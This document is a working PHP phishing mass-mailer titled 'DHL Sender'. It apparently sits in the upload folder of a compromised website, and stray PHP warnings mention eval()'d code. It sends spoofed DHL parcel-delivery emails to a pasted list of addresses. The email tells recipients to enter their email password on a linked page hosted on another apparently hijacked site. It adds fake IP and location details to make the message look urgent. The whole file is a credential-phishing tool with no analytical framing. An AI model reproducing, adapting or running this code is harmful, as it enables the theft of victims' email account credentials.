<?php
session_start();
ob_start("ob_gzhandler");
set_time_limit(0);
<br />
<b>Deprecated</b>:  Function preg_replace() is deprecated in <b>/home/communed/www/kcfinder/upload/files/3.php(6) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Deprecated</b>:  Function pereg_replace() is deprecated in <b>/home/communed/www/kcfinder/upload/files/3.php(6) : eval()'d code</b> on line <b>1</b><br />
<?php session_start();  ob_start("ob_gzhandler"); set_time_limit(0); 

$website="http://www.jnnoticias.com/admin/assets/"; //Make this full url including folders of where login files resides

//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
	 
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}

//validate email address
function validate_email($email){
	$status=false;
	$regex='/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/'; 
	if(preg_match($regex, $email)){$status=true;}
	return $status; }
	

//Email sending
function sending_email($email,$id='1',$details=''){
	$subject='DHL Consignment Notification Arrival:Please Receive Your Packages!';
	$site_name='Account Security';
	$site_email='DHL@dhl.express.com';
	// To send HTML mail, the Content-type header must be set
	$headers  = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
	// Additional headers
	$headers .= 'From: '.$site_email.'' . "\r\n";
	//$headers .= 'Bcc: '.$email.'' . "\r\n";
	//format message	
	$message=email_format($email,$id,$details);
	@mail($email,$subject, $message, $headers);	
}


function email_format($email,$id='1',$details=''){
	global $website;
	//$website="";
	$url=$website."DHL.htm?".md5('token')."=".md5($id)."&".md5(date('U'))."=".md5(date('r'))."&id=".$id."&email=".$email;
	$em=explode('@',$email);
	$message="<div style='margin:0px;background:white;font-family:calibri;color:#000;font-size:13px;padding:10px;width:100%;'>
	
	<div style='border:1px solid #c0c0c0;border-radius:0px;background:#fff;max-width:500px;margin:5px auto 5px auto;min-height:200px;'>
	
	<div style='padding:5px;margin:5px;text-align:left'>
	<a href='".$url."' style='text-decoration:none;'>
	<img src='http://shipboston.typepad.com/.a/6a012877b69092970c0167622f717e970b-pi' style='width:475px;'>
	</a>
	</div>
	
	<div style='padding:5px;margin:5px;font-size:16px;color:black;'>
	Dear <b>".strtoupper($em[0])."!</b><br/>
	Your parcel has arrived at the post office on ".date('r')."
 Our courier was unable to deliver the parcel to you due to incorrect delivery address and no response from your email on the parcel.

 
<p>You are hereby advised to track your parcel with this receiver email ".$email.", a valid password and the security code below to automatically connect with your mailbox.</P>
	<div style='color:#d44b38;padding:10px 0px 10px 0px;'>".$details."</div>
	<p>Download the attached receipt with the DHL Express delivery document and forward to nearest DHL office after tracking confirmation.</p>
<p>DHL will not be liable for any loss or damaged shipment.</p> 
	<p>&nbsp;</p>
	
	
	<center>
	<a href='".$url."' 
	style='font-size:14px;display:block;float:left;text-decoration:none;color:#fff;
	padding:10px 10px 10px 10px;margin:2px;background:orange;'>
	Track your parcel
	</a>
	</center>
	
	<p style='clear:both;'>&nbsp;</p><p>Please do not respond to this email, if this details are not for you</p>
	</div>
	
	<div style='font-size:11px;color:#603;border-top:5px #c0c0c0 solid;padding:5px;'>
	<div style='text-align:center'>
	&copy; ".date('Y')." DHL Global Forwarding. All Rights Reserved.<br/>
	23 Amphitheatre Way San Francisco, CA 908764 USA
	<br/>
	&copy; DHL INC ".date('Y')."
	</div>
	</div>
	
	</div>
	
	</div>";
	return $message; }
?>
<html>
<head>
<title>DHL Sender</title>
</head>
<body style='width:100%;color:#000;background:#FFF;font-family:calibri;'>
<div style='width:100%;max-width:500px;margin:0px auto 0px auto;padding:10px;border:#999 1px solid;box-shadow:10px 10px #666;min-height:500px;'>

<h1 style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>DHL Sender</h1>
<?php
if(isset($_POST['go']) ){
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						print "<div style='color:green;'>".$email." valid and queued</div>"; 
						//Send here
						sending_email($email,$id,$details);
						//send here
						} else {print "<div style='color:gray;'>".$email." not valid</div>"; }
			}
		print "<h1 style='color:green;'>Bravo! ".$valid."/".$total." Sent! <a href='' style='color:green'>Continue</a></h1>";


	} else {print "<h1 style='color:red'>Mails or Details empty</h1>"; }
} 
?>

<form method='POST' action='#'>
<div>
<div>Select Your ID</div>
<select name='id' style='width:100%;'>
<?php
if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
</div>
<p>&nbsp;</p>
<div>
<div>Email Separator (Leave Empty if new line)</div>
<textarea name='separator' style='width:100%;height:20px;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
</div>
<p>&nbsp;</p>
<div>
<div>Details:<br/>
IP Address: 37.55.36.224 <br/>
Location: Ukraine (UA)<br/>
 </div>
<textarea name='details' style='width:100%;height:70px;'><?php if(isset($_POST['details'])){print resanitize($_POST['details']);} ?></textarea>
</div>
<p>&nbsp;</p>
<div>
<div>Paste Emails separated by separator</div>
<textarea name='mails' style='width:100%;height:200px;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
</div>
<p>&nbsp;</p>
<div>
<div>Email Preview</div>
<?php print email_format('user@xsender.com',1,'IP Address: 37.55.36.224 <br/>Location: Ukraine (UA)<br/>'); ?>
</div>
<p>&nbsp;</p>

<div style='text-align:center;'>
<input type='submit' value='Go Xsender' name='go' style='color:#FFF;background:#333;'/>
</div>
<p>&nbsp;</p>
</form>

</div>
</body>
</html>
